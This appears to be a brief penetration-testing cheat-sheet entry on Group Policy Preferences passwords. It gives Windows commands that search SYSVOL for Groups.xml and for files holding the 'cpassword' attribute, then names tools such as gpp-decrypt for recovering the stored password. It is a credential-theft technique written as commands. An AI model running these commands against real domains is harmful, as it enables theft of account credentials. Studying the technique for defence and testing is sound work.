# Group Policy Preferences

Use the `dir` command to find the XML file

`C:\> dir /s Groups.xml`

`C:\> findstr /s cpassword %LOGONSERVER%\sysvol\*.xml`

Copy the attribute called **cpassword** after you've opened the XML file. Then decrypt it using `gpp-decrypt` utility or any other password cracking programs that is highly recommended like **Hashcat** or **John The Ripper**.

`C:\> type C:\path\to\GPP_file.xml`
